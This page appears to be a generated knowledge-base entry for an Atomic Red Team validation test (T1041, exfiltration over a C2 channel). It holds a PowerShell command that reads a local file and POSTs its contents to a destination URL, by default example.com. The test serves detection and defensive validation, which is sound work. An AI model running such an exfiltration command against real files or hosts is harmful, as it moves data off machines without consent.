---
atomic_guid: "d1253f6e-c29b-49dc-b466-2147a6191932"
title: "C2 Data Exfiltration"
framework: "atomic"
generated: "true"
attack_technique_id: "T1041"
attack_technique_name: "Exfiltration Over C2 Channel"
source_url: "https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1041/T1041.yaml"
build_date: "2026-04-27 19:12:26"
executor: "powershell"
aliases:
  - "d1253f6e-c29b-49dc-b466-2147a6191932"
  - "C2 Data Exfiltration"
platforms:
  - "windows"
tags:
  - "atomic"
  - "validation-test"
---

[[index|Home]] • [[kb/attack/index|ATT&CK]] • [[kb/tools/index|Tools]] • [[kb/defend/index|D3FEND]] • [[kb/car/index|CAR]] • [[kb/sigma/index|Sigma]] • [[kb/atomic/index|Atomic]] • [[kb/lolbas/index|LOLBAS]] • [[workspaces/index|Notes]]

Exfiltrates a file present on the victim machine to the C2 server.

## ATT&CK Mapping

- [[kb/attack/techniques/T1041-exfiltration_over_c2_channel|T1041: Exfiltration Over C2 Channel]]

## Input Arguments

### destination_url

- description: Destination URL to post encoded data.
- type: string
- default: example.com

### filepath

- description: The file which is being exfiltrated to the C2 Server.
- type: path
- default: $env:TEMP\LineNumbers.txt

## Executor

- name: powershell

### Command

```powershell
if(-not (Test-Path #{filepath})){ 
  1..100 | ForEach-Object { Add-Content -Path #{filepath} -Value "This is line $_." }
}
[System.Net.ServicePointManager]::Expect100Continue = $false
$filecontent = Get-Content -Path #{filepath}
Invoke-WebRequest -Uri #{destination_url} -Method POST -Body $filecontent -DisableKeepAlive
```

## Source

- [Source YAML](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1041/T1041.yaml)
